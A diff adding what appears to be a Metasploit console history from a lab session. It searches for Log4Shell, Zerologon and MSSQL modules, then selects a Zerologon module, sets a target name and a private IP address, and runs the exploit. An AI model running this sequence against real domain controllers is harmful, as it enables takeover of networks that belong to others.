@@ -1,0 +1,15 @@
+search log4shell
+use auxiliary/scanner/http/log4shell_scanner
+show options
+info
+search log4shell
+search mssql_enum
+info 2
+search zerologon
+info 0
+use 0
+show options
+set NBNAME server2016
+set rhosts 192.168.123.22
+exploit
+ls
